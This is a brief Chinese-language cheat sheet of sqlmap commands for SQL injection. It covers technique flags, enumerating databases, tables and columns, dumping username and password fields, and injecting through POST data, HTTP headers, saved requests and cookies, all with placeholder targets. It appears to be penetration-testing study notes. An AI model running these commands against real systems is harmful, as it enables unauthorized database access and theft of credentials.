##### 一、sqlmap
```
linux下安装pip install sqlmap
sqlmap 四种方法：(如果不确定哪种方法，直接 --techniques BETS)
B:盲注
T:时间盲注
E:报错注入
S:标准注入

sqlmap 标准流程
sqlmap -u "目标注入点" --dbs								// 获得库名
sqlmap -u "目标注入点" -D security --tables				// 获得表名
sqlmap -u "目标注入点" -D security -T users --columns	// 获得列名
sqlmap -u "目标注入点" -D security -T users -C username,password --dump		// 获取字段
```
```
报错注入
sqlmap -u "目标注入点" --dbs --batch --threads 10 --technique E
```
```
post方面
*标识在哪里，就用sqlmap对哪里进行打击

sqlmap -u "目标注入点" --data "username=admin*&password=admin&submit=submit" --dbs --batch --threads 10 --technique E
```
```
http头注入
sqlmap -u "目标注入点" --user-agent="信息*" -- level 4 --dbs --batch --threads 10 --technique E

用神器将数据包抓住，放入文件中，将文件通过bitvise传入kali中
sqlmap -r "/root/shuju.txt" --dbs --batch --threads 10 --technique E
```
```
cookie注入
sqlmap -u "目标注入点" --cookie="" --level 4 --dbs --batch --threads 10 --technique E
```
